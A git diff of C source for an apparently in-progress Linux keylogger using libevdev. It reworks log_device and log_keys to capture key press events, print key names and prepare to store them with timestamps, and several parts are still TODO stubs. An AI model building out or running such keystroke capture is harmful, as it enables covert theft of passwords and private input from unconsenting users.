@@ -18,6 +18,7 @@
 #include <string.h>
 #include <sys/types.h>
 #include <sys/stat.h>
+#include <time.h>
 #include <unistd.h>
 
 void begin_keylogger(void) {
@@ -28,7 +29,7 @@ void end_keylogger(void) {
   // IMPLEMENTATION HERE
 }
 
-void log_device(void) {
+void log_device(key_package* key_package) {
   // open a file to write to. If it doesn't exist yet, this creates it
   FILE* data_storage = fopen("data.txt", "w");
   if (data_storage == NULL) {
@@ -58,6 +59,7 @@ void log_device(void) {
          libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));
 
   // TODO: store this data in a struct
+  
 
   // store data into text file
   fprintf(data_storage, "Device: %s | vendor: %x | product: %x\n",
@@ -87,7 +89,7 @@ void handle_syn_dropped(struct libevdev* dev) {
   }
 }
 
-void log_keys(void) {
+void log_keys(key_package* key_package) {
   // open a file to write to. If it doesn't exist yet, this creates it
   FILE* data_storage = fopen("data.txt", "w");
   if (data_storage == NULL) {
@@ -134,16 +136,42 @@ void log_keys(void) {
       handle_syn_dropped(keyboard_dev);
     } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
       // handle event here
-      printf("We have an event!\n%d (%s) %d (%s) value %d\n", ev.type,
-             libevdev_event_type_get_name(ev.type), ev.code,
-             libevdev_event_code_get_name(ev.type, ev.code), ev.value);
 
-      // TODO: make key struct, add to key package. do the file writing in another file
+      // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
+      // we only care about EV_KEY, represented by ev.type == 1
+      if (ev.type == 1) {
+        if (ev.value == 1 || ev.value == 2) {
+          printf("Key pressed!\n%d (%s) %d (%s) value %d\n",
+                ev.type,
+                libevdev_event_type_get_name(ev.type),
+                ev.code,
+                libevdev_event_code_get_name(ev.type, ev.code), 
+                ev.value);
+          
+          // TODO: get current time here
+
+          // TODO: make key struct, add to key package. do the file writing in another file
+          // key_info pressed_key = {
+          //   .key = libevdev_event_code_get_name(ev.type, ev.code),
+          //   .timestamp = "uh"
+          // };
+
+          // TODO: append to key_package->keys
+        }
+        // else {
+        //   printf("Key unpressed!\n%d (%s) %d (%s) value %d\n",
+        //         ev.type,
+        //         libevdev_event_type_get_name(ev.type),
+        //         ev.code,
+        //         libevdev_event_code_get_name(ev.type, ev.code), 
+        //         ev.value);
+        // }
+      }
 
       // write to text file
-      fprintf(data_storage, "Event: %d (%s) %d (%s) value: %d\n", ev.type,
-              libevdev_event_type_get_name(ev.type), ev.code,
-              libevdev_event_code_get_name(ev.type, ev.code), ev.value);
+      // fprintf(data_storage, "Event: %d (%s) %d (%s) value: %d\n", ev.type,
+      //         libevdev_event_type_get_name(ev.type), ev.code,
+      //         libevdev_event_code_get_name(ev.type, ev.code), ev.value);
     } else {
       printf("unsure of what is going on here..\n");
     }
@@ -164,8 +192,16 @@ void log_keys(void) {
 }
 
 int main(void) {
-  log_device();
-  log_keys();
+  key_package key_package;
+  log_device(&key_package);
+  log_keys(&key_package);
+
+  // time_t rawtime;
+  // struct tm * timeinfo;
+
+  // time ( &rawtime );
+  // timeinfo = localtime ( &rawtime );
+  // printf ( "Current local time and date: %s", asctime (timeinfo) );
 
   return 0;
 }
